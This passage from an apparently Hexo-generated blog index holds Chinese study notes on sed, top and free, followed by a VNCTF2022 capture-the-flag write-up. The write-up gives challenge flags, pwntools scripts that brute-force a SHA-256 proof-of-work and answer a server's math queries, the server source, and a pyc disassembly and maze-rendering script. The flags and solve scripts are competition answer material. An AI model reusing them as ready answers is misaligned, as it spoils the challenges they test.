story.txtecho $?</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"sed里的两个空间\"><a href=\"#sed里的两个空间\" class=\"headerlink\" title=\"sed里的两个空间\"></a>sed里的两个空间</h2><p>在sed对文本进行处理的时候，会用到两个空间（缓冲区）：<code>pattern space</code>模式空间和<code>hold space</code>保持空间。</p>\n<h3 id=\"pattern-space\"><a href=\"#pattern-space\" class=\"headerlink\" title=\"pattern space\"></a>pattern space</h3><p>对于绝大多数的命名操作，其实都是在和<code>pattern space</code>打交道，上面在分析<code>debug</code>的时候看到的<code>PATTERN</code>就是指的<code>pattern space</code>模式空间。它是用来放置正在处理的文本和操作结果的一个缓冲区。<code>p</code>命令打印输出的也是这个空间的内容。</p>\n<h3 id=\"hold-space\"><a href=\"#hold-space\" class=\"headerlink\" title=\"hold space\"></a>hold space</h3><p><code>hold space</code>保持空间就像是一个<code>包裹寄存箱</code>。帮<code>pattern space</code>管理一些需要暂时存放的数据，等<code>pattern space</code>模式空间需要的时候，可以把这里存放的数据再取出来使用。 有些命令的操作会涉及到<code>hold space</code>，比如：</p>\n<ul>\n<li><code>h</code>命令将当前<code>pattern space</code>中的内容替换掉<code>hold space</code>中的老内容。</li>\n<li><code>g</code>命令的操作和<code>h</code>正好相反，从<code>hold space</code>中取出内容放入<code>pattern space</code></li>\n</ul>\n<h4 id=\"g、G、h和H\"><a href=\"#g、G、h和H\" class=\"headerlink\" title=\"g、G、h和H\"></a>g、G、h和H</h4><p>这四个命令是两组在模式空间和保持空间内容迁移的命令。 g和h是一组，g是替换模式空间内容，h是(hold)用来替换保持空间的内容。 G和H是一组，比上面那一组，多了保留原来空间内容的功能。</p>\n<p>为了更清楚得认识他们，我们做一组实验：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">seq 3 | sed --debug -e &#x27;H&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>上面使用<code>seq 3</code>生成一个如下的1-3的序列：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n\n<p>然后通过<code>|</code>管道命令发送给后面的sed处理。</p>\n<h4 id=\"执行多条命令\"><a href=\"#执行多条命令\" class=\"headerlink\" title=\"执行多条命令\"></a>执行多条命令</h4><p>如果你要在同一个文件上执行多次操作，有两种方式：</p>\n<ul>\n<li><code>&#123; cmd; cmd &#125;</code> 你可以执行多条命名中间用<code>;</code>分号分开</li>\n<li><code>-e script -e script </code>也可以用多条<code>-e</code>语句，这里的<code>-e</code>的全量写法是<code>--expression</code></li>\n</ul>\n<p>比如对于<code>story.txt</code>文件，我们希望将所有开头的<code>t</code>换成<code>T</code>，并删除第2和第4句。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -e &#x27;s/^t/T/&#x27; -e &#x27;2d&#x27; -e &#x27;4d&#x27; story.txt# 等价于sed -e &#x27;s/^t/T/; 2d; 4d&#x27; story.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"十：top命令\"><a href=\"#十：top命令\" class=\"headerlink\" title=\"十：top命令\"></a>十：top命令</h4><h5 id=\"top了解服务器的运行状态\"><a href=\"#top了解服务器的运行状态\" class=\"headerlink\" title=\"top了解服务器的运行状态\"></a>top了解服务器的运行状态</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">top - 19:25:37 up  3:46,  2 users,  load average: 0.00, 0.05, 0.10Tasks:  97 total,   1 running,  96 sleeping,   0 stopped,   0 zombie%Cpu(s):  1.0 us,  1.0 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 stKiB Mem :  1014720 total,   207632 free,   313624 used,   493464 buff/cacheKiB Swap:  4095996 total,  3379452 free,   716544 used.   534020 avail Mem  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND 3548 mysql     20   0  985096   5548   1560 S  0.3  0.5   0:06.74 mysqld</span><br></pre></td></tr></table></figure>\n\n<p>别着急，让我们耐心分析一下上面这堆内容，一会你就会全明白的：</p>\n<p>首行：系统的整体情况概览</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">名称            系统运行3时:46分            系统负载：1分钟/5分钟/15分钟级top - 19:25:37 up  3:46,  2 users,  load average: 0.00, 0.05, 0.10     系统当前时间         当前登录用户数2人       对于单核CPU 1.0表示满负载</span><br></pre></td></tr></table></figure>\n\n<p>第2行：进程状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">进程总任务数：97个     运行进程1个  96个当前睡眠状态  停止进程0个    僵尸进程0个Tasks:  97 total,   1 running,  96 sleeping,   0 stopped,   0 zombie</span><br></pre></td></tr></table></figure>\n\n<p>第3行：CPU状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cpu占用比： 用户空间  内核空间  用户定义优先级  空闲   等待IO   硬中断    软中断     虚拟机%Cpu(s):  1.0 us,  1.0 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br></pre></td></tr></table></figure>\n\n<p>第3-4行： 内存和Swap交换区状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">单位 物理内存         总量            空闲           已使用           内核缓存用量KiB Mem :  1014720 total,   207632 free,   313624 used,   493464 buff/cache    交换区           总量            空闲           已使用              可用内存KiB Swap:  4095996 total,  3379452 free,   716544 used.   534020 avail Mem</span><br></pre></td></tr></table></figure>\n\n<p>最后需要了解的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">进程ID      优先级 Nice值 虚拟内存 物理内存 共享内存 CPU  内存    CPU总时间 命令  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND 3548 mysql     20   0  985096   5548   1560 S  0.3  0.5   0:06.74 mysql                                          进程状态</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>NI 负值表示高优先级，正值表示低优先级</p>\n</blockquote>\n<h3 id=\"常用快捷键\"><a href=\"#常用快捷键\" class=\"headerlink\" title=\"常用快捷键\"></a>常用快捷键</h3><ul>\n<li><p><code>shift+e</code> 切换内存显示模式（可重复按键切换）</p>\n</li>\n<li><p><code>z</code> 切换是否彩色显示（可重复按键切换）</p>\n</li>\n<li><p><code>m</code> 切换内存显示模式（可重复按键切换）</p>\n</li>\n<li><p><code>e</code> 切换底部进程中单位的显示模式（可重复按键切换）</p>\n</li>\n<li><h5 id=\"b-切换高亮选中（可重复按键切换）\"><a href=\"#b-切换高亮选中（可重复按键切换）\" class=\"headerlink\" title=\"b 切换高亮选中（可重复按键切换）\"></a><code>b</code> 切换高亮选中（可重复按键切换）</h5></li>\n<li><p><code>W</code> 把当前配置保存到文件中，下次启动top会使用当前的配置</p>\n</li>\n<li><p><code>h</code> 进入帮助菜单 (进入菜单后，可按ESC或q退出帮助菜单)</p>\n</li>\n<li><p><code>q</code> 退出<code>top</code>命令</p>\n</li>\n</ul>\n<h5 id=\"排序字段\"><a href=\"#排序字段\" class=\"headerlink\" title=\"排序字段\"></a>排序字段</h5><p>底部的进程排序，是可以选择按指定列进行排序的。</p>\n<ul>\n<li>先按<code>f</code>进入字段选择界面，</li>\n<li>然后按<code>上下键</code>选择要排序的字段，界面会高亮显示，选中合适的内容</li>\n<li>确定选中操作后，按下<code>s</code>键，激活这个选择。</li>\n<li>最后按<code>q</code>键退出排序字段选择界面。</li>\n</ul>\n<p>你会看到不同的排序界面</p>\n<h4 id=\"十一：free命令\"><a href=\"#十一：free命令\" class=\"headerlink\" title=\"十一：free命令\"></a>十一：free命令</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># free              总量          已用         未用        共享      缓存         可用              total        used        free      shared  buff/cache   availableMem：  内存Swap： 交换区</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>total：系统上安装的总内存量/Swap交换区总量</li>\n<li>used：已用内存，公式：<code>used = total - free - buffers - cache</code></li>\n<li>shared：用作共享内存的内存用量</li>\n<li>buff/cache：所有buff和cache的总用量</li>\n<li>buffers：内核缓冲用量</li>\n</ul>\n<p>其中会让人产生困惑的是<code>free</code>和<code>avaiable</code>这两个字段。</p>\n<ul>\n<li>free：是未使用的内存。</li>\n<li>avaiable：为系统估计的可用于启动新应用而无需交换的可用内存量。</li>\n</ul>\n<p><code>-h</code>有human的含义，意思是给人阅读的选项</p>\n<ul>\n<li>-b, —bytes 以字节为单位展示</li>\n<li>-k, —kilo 以KB为单位展示</li>\n<li>-m, —mega 以MB为单位展示</li>\n<li>-g, —giga 以GB为单位展示</li>\n</ul>\n<blockquote>\n<p>每一种选项提供了缩写和全写两种使用方式，比如：-b 就是缩写 —bytes 就是完整写法</p>\n</blockquote>\n<p>所以下面两种使用方法是等价的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">free -b</span><br><span class=\"line\">free --bytes</span><br></pre></td></tr></table></figure>\n\n<p>当然，有时你可能会想观察一段时间的内存变化。这时，我们可以设置free的更新频率和更新次数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-s 5  # 每隔5s更新一次</span><br><span class=\"line\">-c 10 # 更新10次后结束</span><br></pre></td></tr></table></figure>\n\n<p>所以你可以这样设置，那么每隔5秒更新一次信息，连续更新10次后退出命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">free -s 5 -c 10</span><br></pre></td></tr></table></figure>\n\n<p>你也可以这样设置，每隔2秒更新一次内存用量信息，直到你按下<code>ctrl+c</code>终止这个程序运行，否则这个程序会一直运行下去。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">free -s 2</span><br></pre></td></tr></table></figure>\n","categories":["学习总结"],"tags":["主要是Linux操作命令"]},{"title":"VNCTF2022公开赛","url":"/2022/02/20/VNCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B/","content":"<p>buuoj上的比赛</p>\n<span id=\"more\"></span>\n\n<h5 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h5><h6 id=\"GameV4-0\"><a href=\"#GameV4-0\" class=\"headerlink\" title=\"GameV4.0\"></a>GameV4.0</h6><p>打开<a href=\"http://a068097b-77f0-41a1-b8de-b2861a08c356.node4.buuoj.cn:81/js/data.js\">a068097b-77f0-41a1-b8de-b2861a08c356.node4.buuoj.cn:81/js/data.js</a></p>\n<p>滑倒最下面，找到一串base64解码可得VNCTF%7BWelcome_to_VNCTF2022%7D</p>\n<p>所以是VNCTF{Welcome_to_VNCTF2022}</p>\n<h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"仔细找找\"><a href=\"#仔细找找\" class=\"headerlink\" title=\"仔细找找\"></a>仔细找找</h6><p>用stegsolve打开，可以模糊看到一串字母，换用不同的帧，可以最终拼出flag。</p>\n<p>vnctf{4aE@w}</p>\n<p>小写的w不怎么好分辨。</p>\n<h5 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h5><h6 id=\"easy-math\"><a href=\"#easy-math\" class=\"headerlink\" title=\"easy_math\"></a>easy_math</h6><p>代码引用的别人的，再此记录一下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sha256_def</span>(<span class=\"params\">x,sha256_hash</span>):</span></span><br><span class=\"line\">    a = string.ascii_letters + string.digits</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i1 <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i2 <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i3 <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i4 <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                    c=i1+i2+i3+i4+x</span><br><span class=\"line\">                    c=c.encode()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> sha256(c).hexdigest() == sha256_hash:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(i1+i2+i3+i4)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> i1+i2+i3+i4</span><br><span class=\"line\"><span class=\"comment\">#nc 47.104.85.225 49803</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">28554</span>)</span><br><span class=\"line\"><span class=\"comment\"># context.log_level =&#x27;debug&#x27;</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;(&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#截取后半断的字符串</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;+&quot;</span>)</span><br><span class=\"line\">str_x=sh.recvuntil(<span class=\"string\">&quot;)&quot;</span>).decode()[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;==&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#sha256的hash值</span></span><br><span class=\"line\">sha256_hash1=sh.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>).decode().strip()</span><br><span class=\"line\">data=sha256_def(str_x,sha256_hash1)</span><br><span class=\"line\">sh.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">777</span>):</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">&quot;the &quot;</span>)</span><br><span class=\"line\">    str_x = sh.recvuntil(<span class=\"string\">&quot;th&quot;</span>).decode()[:-<span class=\"number\">2</span>]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(str_x)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">    data=<span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(str_x)*<span class=\"number\">4</span>)</span><br><span class=\"line\">    sh.sendline(data)</span><br><span class=\"line\">    sh.recv()</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sha256_def</span>(<span class=\"params\">a,b</span>):</span></span><br><span class=\"line\">    <span class=\"built_in\">str</span> = string.printable[:<span class=\"number\">62</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i1 <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i2 <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i3 <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i4 <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">                    a1 = i1 + i2 + i3 + i4</span><br><span class=\"line\">                    a2 = a1 + a</span><br><span class=\"line\">                    a2 = a2.encode()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> hashlib.sha256(a2).hexdigest() == b:</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> a1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">29875</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;(&quot;</span>,)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;+&quot;</span>,)</span><br><span class=\"line\">a=sh.recvuntil(<span class=\"string\">&quot;)&quot;</span>,)[:-<span class=\"number\">1</span>].decode()</span><br><span class=\"line\"><span class=\"comment\"># print(a)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&quot;== &quot;</span>,)</span><br><span class=\"line\">b=sh.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>,).decode().strip()</span><br><span class=\"line\"><span class=\"comment\"># print(b)</span></span><br><span class=\"line\"></span><br><span class=\"line\">a1=sha256_def(a,b)</span><br><span class=\"line\"><span class=\"comment\"># print(a1)</span></span><br><span class=\"line\">sh.sendline(a1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">777</span>):</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">&quot;the &quot;</span>,)</span><br><span class=\"line\">    n1=sh.recvuntil(<span class=\"string\">&quot;th&quot;</span>,)[:-<span class=\"number\">2</span>].decode().strip()</span><br><span class=\"line\">    n2=<span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(n1)*<span class=\"number\">4</span>)</span><br><span class=\"line\">    sh.sendline(n2)</span><br><span class=\"line\">    (sh.recv())</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag,check</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> string </span><br><span class=\"line\"></span><br><span class=\"line\">table = string.ascii_letters+string.digits</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>(<span class=\"params\">socketserver.BaseRequestHandler</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_recvall</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        BUFF_SIZE = <span class=\"number\">2048</span></span><br><span class=\"line\">        data = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            part = self.request.recv(BUFF_SIZE)</span><br><span class=\"line\">            data += part</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(part) &lt; BUFF_SIZE:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> data.strip()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">self, msg, newline=<span class=\"literal\">True</span></span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> newline:</span><br><span class=\"line\">                msg += <span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">            self.request.sendall(msg)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">recv</span>(<span class=\"params\">self, prompt=<span class=\"string\">b&#x27;&#x27;</span></span>):</span></span><br><span class=\"line\">        self.send(prompt, newline=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self._recvall()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">proof_of_work</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        proof = (<span class=\"string\">&#x27;&#x27;</span>.join([random.choice(table)<span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)])).encode()</span><br><span class=\"line\">        sha = sha256(proof).hexdigest().encode()</span><br><span class=\"line\">        self.send(<span class=\"string\">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class=\"number\">4</span>:] + <span class=\"string\">b&quot;) == &quot;</span> + sha )</span><br><span class=\"line\">        XXXX = self.recv(prompt = <span class=\"string\">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(XXXX) != <span class=\"number\">4</span> <span class=\"keyword\">or</span> sha256(XXXX + proof[<span class=\"number\">4</span>:]).hexdigest().encode() != sha:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handle</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        proof = self.proof_of_work()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> proof:</span><br><span class=\"line\">            self.request.close()</span><br><span class=\"line\">        counts = <span class=\"number\">0</span></span><br><span class=\"line\">        signal.alarm(<span class=\"number\">60</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">777</span>):</span><br><span class=\"line\">            times = getPrime(<span class=\"number\">32</span>)</span><br><span class=\"line\">            self.send(<span class=\"string\">b&#x27;plz give me the &#x27;</span> + <span class=\"built_in\">str</span>(times).encode() + <span class=\"string\">b&#x27;th (n) that satisfying (2^n-1) % 15 == 0:&#x27;</span>)</span><br><span class=\"line\">            n = <span class=\"built_in\">int</span>(self.recv())</span><br><span class=\"line\">            a , ret = check(times,n)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> a == <span class=\"literal\">True</span>:</span><br><span class=\"line\">                self.send(ret.encode())</span><br><span class=\"line\">                counts += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                self.send(ret.encode())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> counts == <span class=\"number\">777</span>:</span><br><span class=\"line\">            self.send(<span class=\"string\">b&#x27;You get flag!&#x27;</span>)</span><br><span class=\"line\">            self.send(flag)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.send(<span class=\"string\">b&#x27;something wrong?&#x27;</span>)</span><br><span class=\"line\">        self.request.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadedServer</span>(<span class=\"params\">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForkedServer</span>(<span class=\"params\">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    HOST, PORT = <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">10001</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;HOST:POST &quot;</span> + HOST+<span class=\"string\">&quot;:&quot;</span> + <span class=\"built_in\">str</span>(PORT))</span><br><span class=\"line\">    server = ForkedServer((HOST, PORT), Task)</span><br><span class=\"line\">    server.allow_reuse_address = <span class=\"literal\">True</span></span><br><span class=\"line\">    server.serve_forever() </span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h5><h6 id=\"BabyMaze\"><a href=\"#BabyMaze\" class=\"headerlink\" title=\"BabyMaze\"></a>BabyMaze</h6><p>（代码来源于网络）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> dis, marshal, sys</span><br><span class=\"line\"></span><br><span class=\"line\">header_sizes = [</span><br><span class=\"line\">    <span class=\"comment\"># (size, first version this applies to)</span></span><br><span class=\"line\">    <span class=\"comment\"># pyc files were introduced in 0.9.2 way, way back in June 1991.</span></span><br><span class=\"line\">    (<span class=\"number\">8</span>,  (<span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>)),  <span class=\"comment\"># 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp</span></span><br><span class=\"line\">    (<span class=\"number\">12</span>, (<span class=\"number\">3</span>, <span class=\"number\">6</span>)),     <span class=\"comment\"># added 4 bytes file size</span></span><br><span class=\"line\">    <span class=\"comment\"># bytes 4-8 are flags, meaning of 9-16 depends on what flags are set</span></span><br><span class=\"line\">    <span class=\"comment\"># bit 0 not set: 9-12 timestamp, 13-16 file size</span></span><br><span class=\"line\">    <span class=\"comment\"># bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0)</span></span><br><span class=\"line\">    (<span class=\"number\">16</span>, (<span class=\"number\">3</span>, <span class=\"number\">7</span>)),     <span class=\"comment\"># inserted 4 bytes bit flag field at 4-8</span></span><br><span class=\"line\">    <span class=\"comment\"># future version may add more bytes still, at which point we can extend</span></span><br><span class=\"line\">    <span class=\"comment\"># this table. It is correct for Python versions up to 3.9</span></span><br><span class=\"line\">]</span><br><span class=\"line\">header_size = <span class=\"built_in\">next</span>(s <span class=\"keyword\">for</span> s, v <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(header_sizes) <span class=\"keyword\">if</span> sys.version_info &gt;= v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;BabyMaze.pyc&#x27;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    metadata = f.read(header_size)  <span class=\"comment\"># first header_size bytes are metadata</span></span><br><span class=\"line\">    code = marshal.load(f)          <span class=\"comment\"># rest is a marshalled code object</span></span><br><span class=\"line\"></span><br><span class=\"line\">dis.dis(code)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到得到了很多0,2和1个1和1个3,。</p>\n<p>而且很明显是31*31</p>\n<p>处理一下，画个图</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;0000000000000000000000000000000010222222222222222220222222222002020000000002000002020000000200202220222222202220222020222020020000020000000002000002020202002220222022222222222220222022200002020002000000000000020000000022202022202222222220222022202002000202000200000002020002020200222220202220222020202220202220000000020200020202020002020002002222222022222022202022202022200200000000000000020202000202000022222220222222202022202220222002000002020202000200000200000000202220202020202220222222222220020202020202000200020000020002002020202020222022202022202022200202000202000200020202020002000022202220202222202020202220222002000202020200000202020002020200202220202022222220202020202020020200020200000000000202020202002022202020222222222020202020200200020202000002020202020202020022202020222220202022202220202000000200000002000200000002000200222220222220222022222220222220020000020002000200000002000002002222222220222222222222202222300000000000000000000000000000000&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">pic = Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">31</span>,<span class=\"number\">31</span>),(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">31</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">31</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s[i*<span class=\"number\">31</span>+j] == <span class=\"string\">&#x27;0&#x27;</span>):</span><br><span class=\"line\">            pic.putpixel((j,i),(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(s[i*<span class=\"number\">31</span>+j] == <span class=\"string\">&#x27;1&#x27;</span>):</span><br><span class=\"line\">            pic.putpixel((j,i),(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(s[i*<span class=\"number\">31</span>+j] == <span class=\"string\">&#x27;3&#x27;</span>):</span><br><span class=\"line\">            pic.putpixel((j,i),(<span class=\"number\">255</span>,<span class=\"number\">0</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\">pic.show()</span><br><span class=\"line\">pic.save(<span 